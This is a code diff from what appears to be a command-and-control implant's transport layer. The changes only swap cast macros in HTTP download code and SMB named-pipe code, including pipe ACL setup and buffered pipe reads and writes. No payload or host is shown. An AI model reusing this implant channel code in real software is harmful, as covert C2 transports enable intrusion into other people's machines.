@@ -27,7 +27,7 @@ namespace Http {
         ULONG nEndpoint     = 0;
         ULONG nHeaders      = 0;
 
-        Ctx->Transport.http->Method = L"GET";
+        Ctx->Transport.http->Method = CCAST(CONST LPWSTR, L"GET");
 
         if (!Ctx->Transport.http->Handle) {
             if (!(Ctx->Transport.http->Handle = Ctx->win32.WinHttpOpen(Ctx->Transport.http->Useragent, WINHTTP_ACCESS_TYPE_NO_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0))) {
@@ -177,14 +177,14 @@ namespace Http {
                 return_defer(ntstatus);
             }
 
-            x_memcpy(REINTC(PBYTE, Download) + Total, Buffer, Read);
+            x_memcpy(SCAST(PBYTE, Download) + Total, Buffer, Read);
             ZeroFreePtr(Buffer, Read);
 
             Total += Read;
 
         } while (Length > 0);
 
-        (*Inbound) = REINTC(PSTREAM, Ctx->Nt.RtlAllocateHeap(Ctx->Heap, 0, sizeof(STREAM)));
+        (*Inbound) = SCAST(PSTREAM, Ctx->Nt.RtlAllocateHeap(Ctx->Heap, 0, sizeof(STREAM)));
         (*Inbound)->Buffer = Download;
         (*Inbound)->Length = Total;
 
@@ -242,7 +242,7 @@ namespace Smb {
 
         access.Trustee.TrusteeForm = TRUSTEE_IS_SID;
         access.Trustee.TrusteeType = TRUSTEE_IS_WELL_KNOWN_GROUP;
-        access.Trustee.ptstrName = REINTC(LPSTR, SmbSecAttr->Sid);
+        access.Trustee.ptstrName = SCAST(LPSTR, SmbSecAttr->Sid);
 
         if (
             !(result = Ctx->win32.SetEntriesInAclA(1, &access, nullptr, &acl)) ||
@@ -250,7 +250,7 @@ namespace Smb {
             return_defer(ERROR_INVALID_SID);
         }
 
-        if (!(SmbSecAttr->pAcl = REINTC(PACL, Ctx->Nt.RtlAllocateHeap(Ctx->Heap, HEAP_ZERO_MEMORY, MAX_PATH)))) {
+        if (!(SmbSecAttr->pAcl = SCAST(PACL, Ctx->Nt.RtlAllocateHeap(Ctx->Heap, HEAP_ZERO_MEMORY, MAX_PATH)))) {
             return_defer(ERROR_NOT_ENOUGH_MEMORY);
         }
 
@@ -286,7 +286,7 @@ namespace Smb {
         ULONG Total = 0;
 
         do {
-            if (!Ctx->win32.ReadFile(Handle, REINTC(PBYTE, Inbound->Buffer) + Total, MIN((Inbound->Length - Total), PIPE_BUFFER_MAX), &Read, nullptr)) {
+            if (!Ctx->win32.ReadFile(Handle, SCAST(PBYTE, Inbound->Buffer) + Total, MIN((Inbound->Length - Total), PIPE_BUFFER_MAX), &Read, nullptr)) {
                 if (ntstatus == ERROR_NO_DATA) {
                     return FALSE;
                 }
@@ -304,7 +304,7 @@ namespace Smb {
         ULONG Write = 0;
 
         do {
-            if (!Ctx->win32.WriteFile(Handle, REINTC(PBYTE, Outbound->Buffer) + Total, MIN((Outbound->Length - Total), PIPE_BUFFER_MAX), &Write, nullptr)) {
+            if (!Ctx->win32.WriteFile(Handle, SCAST(PBYTE, Outbound->Buffer) + Total, MIN((Outbound->Length - Total), PIPE_BUFFER_MAX), &Write, nullptr)) {
                 return FALSE;
             }
 
@@ -350,7 +350,7 @@ namespace Smb {
                 return_defer(ERROR_NOT_READY);
             }
 
-            (*Inbound) = REINTC(PSTREAM, Ctx->Nt.RtlAllocateHeap(Ctx->Heap, 0, sizeof(STREAM)));
+            (*Inbound) = SCAST(PSTREAM, Ctx->Nt.RtlAllocateHeap(Ctx->Heap, 0, sizeof(STREAM)));
             (*Inbound)->Buffer = Ctx->Nt.RtlAllocateHeap(Ctx->Heap, 0, MsgSize);
             (*Inbound)->Length = MsgSize;
 
